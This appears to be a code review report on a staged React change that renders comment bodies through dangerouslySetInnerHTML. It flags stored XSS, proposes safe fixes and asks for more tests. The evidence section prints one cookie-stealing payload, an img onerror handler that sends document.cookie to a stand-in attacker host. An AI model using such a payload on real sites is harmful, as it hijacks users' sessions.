**Scope:** staged (git diff --cached)

## Intent

**Intent:** inferred: show each comment's body under its author in `CommentList`, keeping line breaks (diff).
**Requirements:** none stated.
**Scope creep:** not judged: no source states a requirement.
**Sources not read:** none.

## What Was Done Well

- The existing test now also asserts the rendered comment body, so the new output has some coverage.
- The diff is small and focused. The list keeps its stable `key={comment.id}`, and the new element sits in the existing `<li>` structure.

## Findings

### Security — Critical

**Location:** `src/components/CommentList.tsx:9`
**Issue:** `comment.body` goes into `dangerouslySetInnerHTML` with only `\n` → `<br>` applied. Nothing escapes or sanitizes the rest of the string, so any HTML in a comment body is parsed and rendered as markup.
**Evidence:** A reader posts a comment whose body is `<img src=x onerror="fetch('//evil.example/?c='+document.cookie)">` → `CommentList` receives it in `comments`, and the `.replace` only touches newlines → the browser parses the `<img>`, the `onerror` handler runs in the site's origin, and the attacker steals sessions or acts as other users for everyone who views the thread (stored XSS). Verification checked `package.json` (no sanitizer such as DOMPurify is a dependency), the `Comment` type (`body: string`, no constraint) and the repository's files (no caller or upstream sanitizer exists). The React precedent "JSX escapes text" does not apply, because its exception names `dangerouslySetInnerHTML`.
**Confidence:** High
**Fix:** Render the body as text, which React escapes, and keep the line breaks with CSS, for example `<p style={{ whiteSpace: 'pre-line' }}>{comment.body}</p>`. Alternatively, split on `\n` and interleave `<br />` elements. If comments must support HTML, sanitize with a maintained library such as DOMPurify (with a strict allow-list) before rendering.

### Tests/Coverage — Suggestion

**Location:** `src/components/CommentList.test.tsx:6-9`
**Issue:** The test only uses the plain body `'Hello'`. It does not cover the new newline → `<br>` conversion or a body that contains HTML characters.
**Evidence:** A regression in the newline handling, or a body such as `<b>x</b>` or `<script>`, would pass the suite unnoticed, because the only asserted input has no newline and no markup.
**Confidence:** High
**Fix:** Add cases for a multi-line body and for a body with HTML characters, asserting that it renders as text (or is sanitized, if HTML is intended).

## Summary

| Category              | Critical | Warning | Suggestion | N/A |
|-----------------------|----------|---------|------------|-----|
| Security              | 1        | 0       | 0          |     |
| Performance           | 0        | 0       | 0          |     |
| Tests/Coverage        | 0        | 0       | 1          |     |
| Architecture          | 0        | 0       | 0          |     |
| Code & File Size      | 0        | 0       | 0          |     |
| Potential Bugs        | 0        | 0       | 0          |     |
| Accessibility         | 0        | 0       | 0          |     |
| Observability         |          |         |            | N/A |
| API Design            |          |         |            | N/A |
| Resilience            |          |         |            | N/A |
| DB Migrations         |          |         |            | N/A |
| Concurrency           |          |         |            | N/A |
| i18n                  |          |         |            | N/A |
| Privacy/Compliance    |          |         |            | N/A |
| Architecture Patterns |          |         |            | N/A |
| Stack-Specific        | 0        | 0       | 0          |     |
| **Total**             | **1**    | **0**   | **1**      |     |

**Verification:** 1 Critical/Warning candidates checked, 0 refuted.

**Review effort:** 1/5 — up to 50 changed lines in 2 files; no risk area.
**Relevant tests:** changed — `src/components/CommentList.test.tsx` renders `CommentList` with one comment and asserts that the author and the body `Hello` appear; it leaves out multi-line bodies and bodies with HTML. Execution: not run.
**Look first:** `src/components/CommentList.tsx` (Critical stored XSS through `dangerouslySetInnerHTML` at line 9), `src/components/CommentList.test.tsx` (no test of newline or HTML input).
**Ready to merge:** No — 1 Critical finding must be fixed before merging.

## Audit

**Files reviewed:** 2 of 2 changed files: `src/components/CommentList.test.tsx`, `src/components/CommentList.tsx`.
**Read for context:** `package.json`, `skill:references/accessibility.md`, `skill:references/intent.md`, `skill:stacks/react.md`, `skill:stacks/typescript.md`.
**Checked with no findings:** Performance, Architecture, Code & File Size, Potential Bugs, Accessibility, Stack-Specific.
**Not verified:** nothing.
